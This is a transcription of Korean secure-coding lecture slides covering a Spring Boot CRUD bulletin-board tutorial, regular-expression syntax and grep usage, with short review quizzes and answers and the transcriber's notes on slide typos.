3. 다음 중 Spring Framework와 비교하여 Spring Boot의 장점이 아닌 것은?
   1) Tomcat이 내장되어 있음　2) WAR 패키징　3) 자동 설정 지원　4) 간편하게 의존성 관리

---

## [2-SLIDES] 3주차 2차시 p.23 · 퀴즈 정답
퀴즈 정답
1. 다음 중 프레임워크와 플랫폼에 대한 설명 중 옳은 것은?
3) 프레임워크는 특정한 개발방식(패턴)을 강제한다.
프레임워크는 강제하는 소프트웨어 개발 패턴과 관련된 코드 라이브러리 모음이며, 플랫폼은 애플리케이션이 실행될 수
있는 하드웨어 및 소프트웨어의 기반을 지칭하는 용어입니다.
2. 다음 중 프레임워크별 지원 언어에 대한 설명이 잘못된 것은?
4) Ruby on Rails - C/C++
Ruby on Rails는 Ruby 언어 기반으로 운영되는 웹 개발 프레임워크입니다.
3. 다음 중 Spring Framework와 비교하여 Spring Boot의 장점이 아닌 것은?
2) WAR 패키징
Spring Boot Framework는 JAR 패키징을 지원하여 독립적인 실행이 가능합니다.

# [2-SLIDES] 3주차 3차시 — Spring Boot 개발 환경·실습
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Mass Assignment/대량 할당/DTO/isAdmin

## [2-SLIDES] 3주차 3차시 p.1 · 실습환경 구축-3
실습환경 구축-3
01 SpringBoot 프레임워크를 활용한 웹프로젝트 구축(2)

---

## [2-SLIDES] 3주차 3차시 p.2 · 학습 목표
학습 목표
SpringBoot 프로젝트 만들기
SpringBoot 기반의 게시판 프로그램 작성

---

## [2-SLIDES] 3주차 3차시 p.3 · 학습 내용
학습 내용
1. 게시판 코드의 구조 이해
2. 코드 입력과 빌드, 실행

---

## [2-SLIDES] 3주차 3차시 p.4 · 실습환경 구축-3
실습환경 구축-3
01 SpringBoot 프레임워크를 활용한 웹프로젝트 구축(2)

---

## [2-SLIDES] 3주차 3차시 p.5 · Spring Boot을 이용한 간단한 게시판 만들기 — Step 1. 설
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
Spring Boot을 이용한 간단한 게시판 만들기 — Step 1. 설계 (게시판 기능 정의 및 아키텍처)

✅ **주요 기능**
- 게시글 작성 (Create)
- 게시글 목록 조회 (Read)
- 게시글 상세 조회 (Read)
- 게시글 수정 (Update)
- 게시글 삭제 (Delete)

✅ **데이터 모델(Entity)**

| 필드명 | 데이터 타입 | 설명 |
| --- | --- | --- |
| id | Long(PK) | 게시글 ID |
| title | String | 제목 |
| content | String | 내용 |
| createAt | LocalDateTime | 생성 날짜 |

(※ 설계표는 `createAt`, 실제 코드(p.9)는 `createdAt`으로 철자가 다름)

---

## [2-SLIDES] 3주차 3차시 p.6 · Spring Boot을 이용한 간단한 게시판 만들기 — Step 1. 설
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
Spring Boot을 이용한 간단한 게시판 만들기 — Step 1. 설계 — **API 설계**

| 기능 | HTTP Method | URL | 요청 데이터 | 응답 데이터 |
| --- | --- | --- | --- | --- |
| 게시글 작성 | POST | /posts | {title, content} | {id, title, content, createAt} |
| 모든 게시글 조회 | GET | /posts | - | {id, title, content, createAt} |
| 게시글 상세 조회 | GET | /posts/{id} | - | {id, title, content, createAt} |
| 게시글 수정 | PUT | /posts/{id} | {title, content} | {id, title, content, createAt} |
| 게시글 삭제 | DELETE | /posts/{id} | - | 성공/실패 메시지 |

---

## [2-SLIDES] 3주차 3차시 p.7 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 2. 환경설정
1. Spring Boot 프로젝트 생성
방법 1: Spring Initializr 사용(https://start.spring.io/)
방법 2: STS (Spring Tool Suite)에서 New -> Spring Starter Project
2. 프로젝트 설정
〮 Project Type: Maven
〮 Language : Java
〮 Spring Boot Version : 최신 안정 버전
〮 Dependencies(필수 라이브러리) 추가
- Spring Web(Rest API 개발)
- Spring Data JPA(DB연동)
- H2 Database(테스트용 인메모리 DB)
- Lombok(코드 간소화)

---

## [2-SLIDES] 3주차 3차시 p.8 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
1. 프로젝트 구조
패키지 종류별 역할
- controller: 사용자 요청 받아들이는 역할
- service: 비즈니스 로직을 수행하는 역할
- repository: DB와 직접 통신하는 역할
- dto: Data Transfer Object – 요청과 응답 데이터를 담는 클래스
- entity: DB 테이블과 연결되는 클래스

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[프로젝트 구조 캡처]

```
src
└─ main
   └─ java
      └─ com
         └─ example
            └─ board
               ├─ controller
               │   └─ PostController.java
               ├─ dto
               │   ├─ PostRequestDto.java
               │   └─ PostResponseDto.java
               ├─ entity
               │   └─ Post.java
               ├─ repository
               │   └─ PostRepository.java
               ├─ service
               │   └─ PostService.java
               └─ MainApplication.java
```

---

## [2-SLIDES] 3주차 3차시 p.9 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
2. Entity (Post.java)
@Entity → DB 테이블과 연결되는 객체
@Id, @GeneratedValue → 기본 키 자동 증가
LocalDateTime createdAt → 생성 날짜 저장

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
package com.example.board.entity;

import jakarta.persistence.*;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;

import java.time.LocalDateTime;

@Entity
@Getter
@Setter
@NoArgsConstructor
public class Post {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    private String title;
    private String content;
    private LocalDateTime createdAt = LocalDateTime.now();
}
```

---

## [2-SLIDES] 3주차 3차시 p.10 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
3. Repository (PostRepository.java)
설명
- JpaRepository<Post, Long> -> 기본 CRUD 메서드 자동 제공 ( save(), findAll(), findById(), deleteById() )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
package com.example.board.repository;

import com.example.board.entity.Post;
import org.springframework.data.jpa.repository.JpaRepository;

public interface PostRepository extends JpaRepository<Post, Long> {
}
```

---

## [2-SLIDES] 3주차 3차시 p.11 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
4. DTO (PostRequestDto.java, PostResponseDto.java)
PostRequestDto.java (클라이언트에서 요청받는 데이터)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
package com.example.board.dto;

import lombok.Getter;

@Getter
public class PostRequestDto {
    private String title;
    private String content;
}
```

---

## [2-SLIDES] 3주차 3차시 p.12 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
PostResponseDto.java (응답할 데이터)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지]

```java
package com.example.board.dto;

import com.example.board.entity.Post;
import lombok.Getter;

import java.time.LocalDateTime;

@Getter
public class PostResponseDto {
    private Long id;
    private String title;
    private String content;
    private LocalDateTime createdAt;

    public PostResponseDto(Post post) {
        this.id = post.getId();
        this.title = post.getTitle();
        this.content = post.getContent();
        this.createdAt = post.getCreatedAt();
    }
}
```

---

## [2-SLIDES] 3주차 3차시 p.13 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
5. Service (PostService.java)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지 (슬라이드에서는 좌우 두 칸으로 나뉘어 있음)]

```java
package com.example.board.service;

import com.example.board.dto.PostRequestDto;
import com.example.board.dto.PostResponseDto;
import com.example.board.entity.Post;
import com.example.board.repository.PostRepository;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;
import java.util.stream.Collectors;

@Service
public class PostService {
    private final PostRepository postRepository;

    public PostService(PostRepository postRepository) {
        this.postRepository = postRepository;
    }

    public List<PostResponseDto> getAllPosts() {
        return postRepository.findAll().stream()
                .map(PostResponseDto::new)
                .collect(Collectors.toList());
    }

    public PostResponseDto getPostById(Long id) {
        Post post = postRepository.findById(id).orElseThrow();
        return new PostResponseDto(post);
    }

    public PostResponseDto createPost(PostRequestDto requestDto) {
        Post post = new Post();
        post.setTitle(requestDto.getTitle());
        post.setContent(requestDto.getContent());
        postRepository.save(post);
        return new PostResponseDto(post);
    }

    @Transactional
    public PostResponseDto updatePost(Long id, PostRequestDto requestDto) {
        Post post = postRepository.findById(id).orElseThrow();
        post.setTitle(requestDto.getTitle());
        post.setContent(requestDto.getContent());
        return new PostResponseDto(post);
    }

    public void deletePost(Long id) {
        postRepository.deleteById(id);
    }
}
```

---

## [2-SLIDES] 3주차 3차시 p.14 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 3. 코드 개발
6. Controller (PostController.java)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 통째로 이미지 (슬라이드에서는 좌우 두 칸으로 나뉘어 있음)]

```java
package com.example.board.controller;

import com.example.board.dto.PostRequestDto;
import com.example.board.dto.PostResponseDto;
import com.example.board.service.PostService;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@RequestMapping("/posts")
public class PostController {
    private final PostService postService;

    public PostController(PostService postService) {
        this.postService = postService;
    }

    @GetMapping
    public List<PostResponseDto> getAllPosts() {
        return postService.getAllPosts();
    }

    @GetMapping("/{id}")
    public PostResponseDto getPost(@PathVariable Long id) {
        return postService.getPostById(id);
    }

    @PostMapping
    public PostResponseDto createPost(@RequestBody PostRequestDto requestDto) {
        return postService.createPost(requestDto);
    }

    @PutMapping("/{id}")
    public PostResponseDto updatePost(@PathVariable Long id, @RequestBody PostRequestDto requestDto) {
        return postService.updatePost(id, requestDto);
    }

    @DeleteMapping("/{id}")
    public void deletePost(@PathVariable Long id) {
        postService.deletePost(id);
    }
}
```

---

## [2-SLIDES] 3주차 3차시 p.15 · Spring Boot을 이용한 간단한 게시판 만들기
Spring Boot을 이용한 간단한 게시판 만들기
Step 4. 실행 및 테스트
1. Spring Boot 실행
〮 MainApplication.java 실행
〮 http://localhost:8080/posts 에서 API 테스트
2. Postman으로 CRUD 테스트
〮 POST /posts -> 게시글 생성
〮 GET /posts -> 모든 게시글 조회 (목록)
〮 GET /posts/{id} -> 특정 게시글 조회
〮 PUT /posts/{id} -> 게시글 수정
〮 DELETE /posts/{id} -> 게시글 삭제

---

## [2-SLIDES] 3주차 3차시 p.16 · 시연 영상
시연 영상
Spring Boot 게시판 만들기

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[시연 영상 자리 — 'Spring Boot 게시판 만들기'. PDF에는 영상이 포함되지 않아 빈 화면]

---

## [2-SLIDES] 3주차 3차시 p.17 · 요약 정리
요약 정리
- 게시판 API 구조를 CRUD 기능 중심으로 설계
- DB 테이블과 매핑하기 위해 Entity에 JPA Annotation을 반영
- Repository의 기본 기능은 JpaRepository를 상속하여 자동 구현
- 서비스 계층에서 DTO를 사용해 비즈니스 로직 처리
- Postman을 활용하여 API 기능을 직접 테스트 가능

---

## [2-SLIDES] 3주차 3차시 p.18 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [이지스퍼블리싱] Do it! 점프 투 스프링부트 3(2023.12)
- SpringBoot - https://spring.io/
- Spring Initializ - https://start.spring.io/
- Postman - https://www.postman.com/

---

## [2-SLIDES] 3주차 3차시 p.19 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 3주차 3차시 p.20 · 퀴즈
퀴즈
1. 다음 중, Spring Boot 개발 방법론에서 계층별 설명이 잘못된 것은?
1) Controller - Request에 대한 처리 로직 2) DTO - 데이터 엔티티 모델링
3) Repository - 데이터베이스와 상호작용 담당 4) Service - 화면 UI 처리 로직
2. 게시판 만들기 실습에서 사용한 테스트용 In-Memory DB의 이름은? (2글자)
( )
3. 다음 중, 게시판 만들기 실습 내용에 대한 설명 중 잘못된 것은?
1) PUT /posts - 게시글 생성 2) DELETE /posts/{id} - 게시글 삭제
3) GET /posts/{id} - 특정 게시물 조회 4) GET /posts - 게시글 목록 조회

---

## [2-SLIDES] 3주차 3차시 p.21 · 퀴즈 정답
퀴즈 정답
1. 다음 중, Spring Boot 개발 방법론에서 계층별 설명이 잘못된 것은?
4) Service - 화면 UI 처리 로직
서비스 계층은 비즈니스 로직을 처리하는 계층입니다.
2. 게시판 만들기 실습에서 사용한 테스트용 In-Memory DB의 이름은? (2글자)
( H2 )
3. 다음 중, 게시판 만들기 실습 내용에 대한 설명 중 잘못된 것은?
1) PUT /posts - 게시글 생성
게시글을 생성할 때에는 POST를 사용하며, PUT은 게시글을 수정할 때 사용합니다.

# [2-SLIDES] 4주차 1차시 — 정규식과 입력값 검증·XSS 필터
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet

## [2-SLIDES] 4주차 1차시 p.1 · 정규식 기본문법
정규식 기본문법
01 문자 다루기
02 반복 다루기
03 문자열 다루기

---

## [2-SLIDES] 4주차 1차시 p.2 · 학습 목표
학습 목표
정규식의 개념과 용도를 이해한다.
정규식을 적절히 활용하는 방법을 습득한다.

---

## [2-SLIDES] 4주차 1차시 p.3 · 학습 내용
학습 내용
1. 정규식으로 문자 다루는 법
2. 정규식으로 문자의 반복을 다루는 법
3. 정규식으로 문자열을 다루는 법

---

## [2-SLIDES] 4주차 1차시 p.4 · 정규식 기본 문법
정규식 기본 문법
01 문자 다루기
02 반복 다루기
03 문자열 다루기

---

## [2-SLIDES] 4주차 1차시 p.5 · 정규식이란?
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
정규식이란?

정규식(Regular Expression, Regex)의 개념
- 텍스트 패턴을 정의하는 표현식으로, 특정 문자열을 검색, 검사, 치환하는 데 사용
- 다양한 프로그래밍 언어에서 지원하며, 입력 검증, 데이터 추출, 문자열 변환 등에 활용

주요 기능
- 특정 패턴의 문자열 찾기 (search, match)
- 문자열 변환 및 치환 (replace, sub)
- 데이터 필터링 (validate, sanitize)

기본 예시

| 정규식 | 설명 | 매칭 예시 |
| --- | --- | --- |
| `\d+` | 숫자(0~9) 하나 이상 | 123 또는 4567 |
| `[a-zA-Z]+` | 영문자 하나 이상 | hello 또는 SecureCoding |
| `\w+@\w+\.\w+` | 이메일 패턴 | user@example.com |

---

## [2-SLIDES] 4주차 1차시 p.6 · 정규식이란?
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
정규식이란?

**사용자 입력 내용 검증**
- 이메일 형식 확인: `\w+@\w+\.\w+` — `user@example.com` (O), `user@@example` (X)
- 우편번호(숫자 5자리) 확인: `\d{5}` — `12345` (O), `12a45` (X)

**특정 패턴의 데이터 찾기**
- 전화번호 찾기: `/010-\d{4}-\d{4}/` — 검색 결과: "내 번호는 **010-1234-1234**5번이야" (노란 강조는 앞의 `010-1234-1234`까지만. 뒤의 5는 매칭에서 빠짐)
- "Error"로 시작하는 로그 메시지 찾기: `/^Error:.+/` — 검색 결과: "**Error: 파일을 찾을 수 없습니다.**"

[그림: 이메일 정규식 해설 도식] `\b[\w.%+-]+@[\w.-]+\.[a-zA-Z]{2,6}\b` — Parse: username@domain.TLD (top level domain)

| 부분 | 설명 |
| --- | --- |
| `\b` (앞·뒤) | word boundary |
| `[\w.%+-]` | character set [...] (match one out of several) — any alpha-numeric char, _ 와 special characters |
| `+` | match previous [...] pattern at least one time |
| `@` | At symbol |
| `[\w.-]+` | alpha-num, _, dot, or dash char |
| `\.` | dot |
| `[a-zA-Z]` | upper or lower alpha character |
| `{2,6}` | the {x,y} modifier means that the previous pattern must have 2-6 characters |

(출처: https://kottke.org/21/07/a-history-of-regular-expressions-and-artificial-intelligence)

---

## [2-SLIDES] 4주차 1차시 p.7 · 정규식 활용 사례
정규식 활용 사례
정규식은 어디에서 활용될까?
〮 로그 분석: 서버 로그에서 특정 패턴을 포함한 로그 검색
〮 데이터 변환 및 정제: 대량의 CSV, JSON 데이터를 필터링
〮 보안 필터링: SQL Injection, XSS, Command Injection 탐지
〮 웹 크롤링: HTML 소스에서 특정 데이터 추출
정규식은 다양한 분야에서 활용되지만, 잘못 사용하면 성능 저하와 보안 문제가 발생할 수 있음

---

## [2-SLIDES] 4주차 1차시 p.8 · 정규식 문자 다루기 — 문자 다루기
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
정규식 문자 다루기 — 문자 다루기

| 정규식 | 설명 | 매칭 예시 |
| --- | --- | --- |
| `.` | 아무 문자나 하나 | a, b, c |
| `[abc]` | a, b, c 중 하나 | aaa, abc, cca, bbbbbacacac |
| `[a-z]` | 소문자 알파벳 (a~z) | hello, secure |
| `[A-Z]` | 대문자 알파벳 (A~Z) | SECURE, TEST |
| `[0-9]` | 숫자 (0~9) | 123, 9876 |
| `[a-zA-Z0-9]` | 영문 대소문자 + 숫자 | Hello123 |
| `[^a-z]` | 소문자가 아닌 문자 | HELLO, 123, !@# |

---

## [2-SLIDES] 4주차 1차시 p.9 · 정규식 문자 다루기 — 기본 문자 클래스 (Character Class)
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
정규식 문자 다루기 — 기본 문자 클래스 (Character Class)

| 정규식 | 설명 | 매칭 예시 | 비고 |
| --- | --- | --- | --- |
| `\d` | 숫자 (0~9) | 123, 4567 | `[0-9]`와 동일 |
| `\D` | 숫자가 아닌 문자 | abc, @!$ | `[^0-9]`와 동일 |
| `\w` | 영문자 + 숫자 + _ | hello, user_123 | `[a-zA-Z0-9_]`와 동일 |
| `\W` | 영문자/숫자가 아닌 기호 | !@#, %^&*() | `[^a-zA-Z0-9_]`와 동일 |
| `\s` | 공백 문자 (띄어쓰기, 탭, 개행 등) | "Hello World" | `[ \t\n\r\f\v]`와 동일 |
| `\S` | 공백이 아닌 문자 | "Hello", "123!" | `[^ \t\n\r\f\v]`와 동일 |
| `\h` | 수평 공백 (스페이스, 탭) | Hello World | `[ \t]`와 동일 |
| `\H` | 수평 공백이 아닌 문자 | Hello123 | `[^ \t]`와 동일 |
| `\v` | 수직 공백 (개행, 폼 피드 등) | \n, \r, \f | `[ \n\r\f]`와 동일 |
| `\V` | 수직 공백이 아닌 문자 | Hello123 | `[^ \n\r\f]`와 동일 |
| `\b` | 단어 경계 (Word Boundary) | " hello " (O), "sayhello" (X) | `\bhello\b` |
| `\B` | 비단어 경계 (Not a Word Boundary) | "sayhello" (O), " hello " (X) | `\Bhello\B` |

※ 원본 오류로 보임: `\Bhello\B`는 hello **양쪽 모두** 단어 중간이어야 하므로 "sayhello"(hello 뒤가 단어 끝)도 매칭되지 않습니다. 직접 실행해 보면 `\Bhello`(앞쪽만)일 때 "sayhello"가 매칭됩니다.
※ `\h` `\H` `\V`는 Java·PCRE 등에서 지원하고, 파이썬 `re`나 자바스크립트에서는 지원하지 않습니다. `\v`의 의미도 엔진마다 다릅니다(파이썬·JS에서는 수직 탭 한 글자).

---

## [2-SLIDES] 4주차 1차시 p.10 · 정규식 기본 문법
정규식 기본 문법
01 문자 다루기
02 반복 다루기
03 문자열 다루기

---

## [2-SLIDES] 4주차 1차시 p.11 · 반복 다루기 — 반복 메타문자
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
반복 다루기 — 반복 메타문자

| 정규식 | 설명 | 매칭 예시 | 비고 |
| --- | --- | --- | --- |
| `a+` | a가 1번 이상 반복 | a, aa, aaa | 최소 1개 이상 |
| `b*` | b가 0번 이상 반복 | (빈 문자열), b, bbb | b가 없어도 됨 |
| `c?` | c가 0번 또는 1번 등장 | (빈 문자열), c | c가 최대 1개 |
| `\d{3}` | 정확히 3개의 숫자 | 123, 987 | `{n}` 사용 |
| `\d{2,4}` | 2~4개의 숫자 | 12, 4567 | `{n,m}` 사용 |
| `\d{2,}` | 2개 이상 숫자 | 12, 45678 | `{n,}` 사용 |
| `(hi)+` | 'hi'가 1회 이상 반복되는 패턴 | hi, hihi, hihihi | 전체 패턴('hi')이 반복되어야 함 |
| `(ab){2,}` | 'ab'가 2회 이상 반복되는 패턴 | abab, ababab, abababab | 전체 그룹('ab')이 반복되어야 함 |

---

## [2-SLIDES] 4주차 1차시 p.12 · 반복 다루기 — 실무 활용 예시
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
반복 다루기 — 실무 활용 예시

| 사용 목적 | 정규식 | 매칭 예시 |
| --- | --- | --- |
| 숫자 6자리 (주민번호 앞자리 등) | `^\d{6}$` | 901231 (O), 90123 (X) |
| 영문자/숫자/밑줄로 구성된 5~12자리 ID | `^[A-Za-z0-9_]{5,12}$` | user_01 (O), a!23 (X) |
| 전화번호 형식 검증 | `^\d{2,3}-\d{3,4}-\d{4}$` | 010-1234-5678 (O), 02-4567 (X) |
| 이메일 주소 형식 | `^[\w\.-]+@[\w\.-]+\.\w{2,3}$` | user@example.com (O), user@com (X) |
| URL 시작 형식 검사 | `^https?://[\w.-]+` | https://example.com (O), ftp://example.com (X) |

---

## [2-SLIDES] 4주차 1차시 p.13 · 정규식 기본 문법
정규식 기본 문법
01 문자 다루기
02 반복 다루기
03 문자열 다루기

---

## [2-SLIDES] 4주차 1차시 p.14 · 문자열 다루기
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
문자열 다루기

**문자열의 시작과 끝**

| 정규식 | 설명 | 매칭 예시 |
| --- | --- | --- |
| `^errror` | "error"로 시작하는 문자열 찾기 | "error: not found" (O), "no error" (X) |
| `end\.$` | 마침표로 끝나는 "end." 찾기 | "This is the end." (O), "the end!" (X) |

※ 원본 오타: 정규식이 `^errror`(r 3개)로 적혀 있어 그대로 쓰면 "error"를 찾지 못합니다. `^error`가 맞습니다.

**단어 경계**

| 정규식 | 설명 | 매칭 예시 |
| --- | --- | --- |
| `\berror\b` | 독립적인 단어 "error" 찾기 | "error occurred" (O), "terror" (X) |
| `\Bing` | "ing"가 단어 중간에 있는 경우 찾기 | "running", "singing" |

**특정 문자열 포함 여부 검사**

| 정규식 | 설명 | 매칭 예시 |
| --- | --- | --- |
| `apple` | "apple" 포함 여부 검사 | "I like apple" (O), "I like oranges" (X) |
| `foo\|bar` | "foo" 또는 "bar" 포함 여부 검사 | "barbeque" (O), "ba rricade" (X) |
| `.*test.*` | "test"가 포함된 문자열 | "unit test passed" (O) |
| `^(?!admin).+` | "admin"으로 시작하지 않는 문자열 | "user123" (O), "admin123" (X) |

(표 안의 `foo\|bar`는 마크다운 표 때문에 `|` 앞에 `\`를 붙였습니다. 실제 정규식은 `foo|bar`)

---

## [2-SLIDES] 4주차 1차시 p.15 · 문자열 다루기 — 자주 사용되는 정규식
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
문자열 다루기 — 자주 사용되는 정규식

| 사용 목적 | 정규식 | 매칭 예시 |
| --- | --- | --- |
| 날짜 형식(YYYY-MM-DD)으로 찾기 | `\b\d{4}-\d{2}-\d{2}\b` | "2024-05-08" (O), "24-5-8" (X) |
| 대소문자 구분 없이 "password" 찾기 | `(?i)password` | "Password123" (O), "passWord" (O) |
| 로그에서 http 또는 https로 시작하는 URL 찾기 | `https?://[^\s]+` | "https://abc.com" (O), "abc.com" (X) |
| 영문자+숫자 8자 이상 검사 | `^[A-Za-z0-9]{8,}$` | "Secure12" (O), "pass!" (X) |
| 대문자+숫자 포함된 6자 이상 비밀번호 검사 | `(?=.*[A-Z])(?=.*\d).{6,}` | "Secur3" (O), "secure" (X) |

---

## [2-SLIDES] 4주차 1차시 p.16 · 정규식 시각적 이해
정규식 시각적 이해
정규식 디버깅 및 시각적 학습 도구
1. REGEXPER(regexper.com)
정규식을 이미지로 표시해 주는 사이트
2. RegExr (regexr.com)
정규식을 실시간으로 테스트하고 학습할 수 있는 사이트
3. regex101 (regex101.com)
정규식 패턴을 해석하고, 다양한 정규식 엔진을 지원
정규식은 한눈에 이해하기 어렵기 때문에 시각적 도구를 활용하여 디버깅하면 더욱 효과적임

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[REGEXPER 화면 캡처 — 'You thought you only had two problems…']
입력: `^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$` → [Display]
도식(왼쪽→오른쪽): Start of line → word(1회 이상 반복 루프) → "@" → One of: "a"-"z", "A"-"Z", "_" (반복 루프) → "." → One of: "a"-"z", "A"-"Z" (1…2 times 반복) → End of line → line feed (0x0A)

---

## [2-SLIDES] 4주차 1차시 p.17 · 요약 정리
요약 정리
〮
정규식은 텍스트 패턴을 정의하는 표현식으로, 특정 문자열을 검색, 검사, 치환, 필터링하는 데 사용
〮
정규식을 활용하여 데이터 검증, 보안 필터링, 로그 분석 등을 효과적으로 수행할 수 있다.
〮
정규식은 강력한 도구이지만, 올바르게 사용해야 효과적이다.

---

## [2-SLIDES] 4주차 1차시 p.18 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- 정규식 도식화 – https://regexper.com/
- 정규식 테스트 - https://regexr.com/
- 정규식 테스트 - https://regex101.com/
- 정규식 시각화 - https://jex.im/regulex/

---

## [2-SLIDES] 4주차 1차시 p.19 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 4주차 1차시 p.20 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 정규식에서 `^` (Caret) 기호의 의미로 알맞은 것은?
   1) 특정 단어를 강조하는 역할　2) 문자열의 시작을 의미　3) 숫자만 매칭하는 역할　4) 공백을 무시하는 역할
2. 다음 중 정규식 `a?b`가 매칭할 수 있는 문자열은 무엇일까요? (2개)
   1) b　2) ab　3) aabb　4) abc
3. 정규식을 사용할 때, 특정 문자가 한 번 이상 반복될 경우 사용할 수 있는 기호는 무엇일까요?　(　　)

---

## [2-SLIDES] 4주차 1차시 p.21 · 퀴즈 정답
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈 정답

1. **2) 문자열의 시작을 의미** — `^hello`라는 정규식은 "hello"로 시작하는 문자열을 찾습니다.
2. **1) b, 2) ab** — `?`는 앞의 문자가 0번 또는 1번 나올 수 있음을 의미합니다.
3. **( + )** — `+`는 앞에 나온 문자가 한 번 이상 반복될 경우 매칭할 때 사용합니다.

# [2-SLIDES] 4주차 2차시 — 정규식과 입력값 검증·XSS 필터
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · ReDoS/레도스/백트래킹/Backtracking · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT

## [2-SLIDES] 4주차 2차시 p.1 · 정규식 활용한 데이터 검증
정규식 활용한 데이터 검증
01 명령어에서 정규식 활용
02 프로그램에서 정규식 활용

---

## [2-SLIDES] 4주차 2차시 p.2 · 학습 목표
학습 목표
리눅스 시스템에서 정규식을 활용하여 정보를 처리한다.
자바 프로그램에서 정규식을 활용하여 정보를 처리한다.

---

## [2-SLIDES] 4주차 2차시 p.3 · 학습 내용
학습 내용
1. 리눅스 터미널에서 활용할 수 있는 정규식 활용법
2. 자바 프로그램에서 활용할 수 있는 정규식 활용법

---

## [2-SLIDES] 4주차 2차시 p.4 · 정규식 활용한 데이터 검증
정규식 활용한 데이터 검증
01 명령어에서 정규식 활용
02 프로그램에서 정규식 활용

---

## [2-SLIDES] 4주차 2차시 p.5 · grep 명령어에서 정규식 사용
grep 명령어에서 정규식 사용
grep 명령어
grep(Global Regular Expression Print)은 리눅스에서 문자열을 검색하는 강력한 명령어. 특정 패턴을 파일이나 표준 입력에서 찾아
출력하는 역할을 하며, 정규 표현식을 지원하여 다양한 패턴 매칭을 수행할 수 있다.
grep 명령어 기본 사용법
grep [옵션] “검색할 패턴” 파일명
$ grep “hello” sample.txt  sample.txt 파일에서 hello가 포함된 모든 라인을 출력

---

## [2-SLIDES] 4주차 2차시 p.6 · grep 명령어에서 정규식 사용 — grep 명령어에서 자주 사용하는 옵
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
grep 명령어에서 정규식 사용 — grep 명령어에서 자주 사용하는 옵션

| 옵션 | 설명 |
| --- | --- |
| `-i` | 대소문자 구분 없이 검색 |
| `-v` | 패턴과 일치하지 않는 줄 출력 |
| `-n` | 검색된 줄의 줄 번호 출력 |
| `-c` | 패턴과 일치하는 줄의 개수만 출력 |
| `-r` | 디렉토리 내 모든 파일을 재귀적으로 검색 |
